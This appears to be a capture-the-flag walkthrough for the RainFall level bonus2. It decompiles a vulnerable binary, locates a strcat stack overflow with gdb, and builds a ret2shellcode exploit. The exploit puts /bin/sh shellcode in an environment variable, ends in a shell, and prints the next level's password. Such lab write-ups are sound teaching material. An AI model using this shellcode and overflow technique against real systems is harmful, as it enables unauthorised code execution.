# Bonus 2

## Answer
Our C source code generates almost the same assembly code as the original binary. Compile it as follows:
> There is a significant difference as mentioned in the comments of the source code. I assume this is due to optimization. Nonetheless, it doesn't change the program's behavior
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdlib.h>
#include <string.h>

int language = 0;

void greetuser(char *str)
{
    char buf[64];

    switch (language)
    {
    case 0:
        strcpy(buf, "Hello ");
        break;

    case 1:
        strcpy(buf, "Hyvää päivää ");
        break;

    case 2:
        strcpy(buf, "Goedemiddag! ");
        break;
    }

    strcat(buf, str);
    puts(buf);
}

// one line difference main+31 (extra use of eax) and what appears to be a memcpy
int main(int argc, char **argv)
{
    char buf[76];
    char *ret;
    char truc[64];

    if (argc != 3)
        return 1;

    memset(buf, 0, 76);
    strncpy(buf, argv[1], 40);
    strncpy(buf + 40, argv[2], 32);

    ret = getenv("LANG");
    if (ret != 0)
    {
        if (memcmp(ret, "fi", 2) == 0)
            language = 1;
        else if (memcmp(ret, "nl", 2) == 0)
            language = 2;
    }
    /* memcpy(esp, buf, 76); This happens in the assembly, I assume because of an optimization */
    greetuser(buf);
}
```

Let's focus on the `main` function. It reads input from the command line and then `strncpy` copies it to the `buf` buffer. It copies 40 bytes from the first argument and 32 bytes from the second argument. Because of the `memset` function, the `buf` buffer is null terminated.

However, the `greetuser` function is called and will concatenate the `buf` buffer with a string depending on the `language` variable. The `language` variable is set depending on the `LANG` environment variable. This will allow us to overflow the buffer and overwrite the return address of the `greetuser` function.

Let's first see how many bytes we need to overflow the buffer by analyzing the stack layout of our program:
```bash
(gdb) b *greetuser+163 # Breaking before leave
Breakpoint 1 at 0x8048527

(gdb) r 4 2 # Run the program
Starting program: /home/user/bonus2/bonus2 4 2
Goedemiddag! päivää 4 # I had LANG=nl in this scenario

Breakpoint 1, 0x08048527 in greetuser ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xbffff620       0xbffff620
ebp            0xbffff678       0xbffff678
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 72 bytes:
```
0xbffff678 - 0xbffff620 = 58 (88 in decimal)
```

Furthermore, we can see that our buffer is located at `-0x48(%ebp),%eax`. Since our buffer is located at `ebp - 72`, we only have to write 72 bytes before reaching `ebp`.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 76 bytes (72 + 4).

Anything written beyond those 76 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

We can write a total of 72 bytes from the `main` function, and if our `LANG` environment variable isn't set to `nl` or `fi`, we can write 6 more bytes from the `greetuser` function. So a total of 78 bytes. Enough to overflow the buffer but not enough to write an address (we're missing 2 bytes for our address). So we'll have to set our `LANG` environment variable to `nl` or `fi`:
```bash
bonus2@RainFall:~$ export LANG=nl
```

I'll use `nl`, which will allows us to write 13 bytes from the `greetuser` function. So a total of 85 bytes. Enough to overflow the buffer and write an address.

Since we need 76 bytes to reach the return address our padding will be:
```
40 bytes from the first argument + 23 bytes from the second argument + 13 bytes from the greetuser function = 76 bytes
```

Although a ret2libc is possible, we'll use a ret2shellcode for this challenge. The ret2libc isn't straightforward in this exercise and I don't want to spend too much time on it.

Check the [level1's walkthrough](../level1/walkthrough.md#ret2shellcode) for an explanation of the ret2shellcode technique.

We can either feed our shellcode to the program, or we can put the shellcode in an environment variable. For convenience, we'll use the environment variable:
```bash
bonus2@RainFall:~$ export EXPLOIT=`python -c "print '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

We'll write and run a C program to find the address of the environment variable:
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("%p\n", getenv("EXPLOIT"));
    return 0;
}
```

```bash
bonus2@RainFall:/tmp$ ./a.out
0xbffff848
```

Alright, let's craft our payload:
```
arg1 = padding of 40 bytes
arg2 = padding of 23 bytes + address of the shellcode in the env

arg1 = A * 40
arg2 = B * 23 + "\xbf\xff\xf8\x48"
```

Let's run it:
```bash
bonus2@RainFall:~$ ./bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*23 + "\xbf\xff\xf8\x48"[::-1]'`
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBQ���
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

We are now bonus3! Let's move on to the next level.
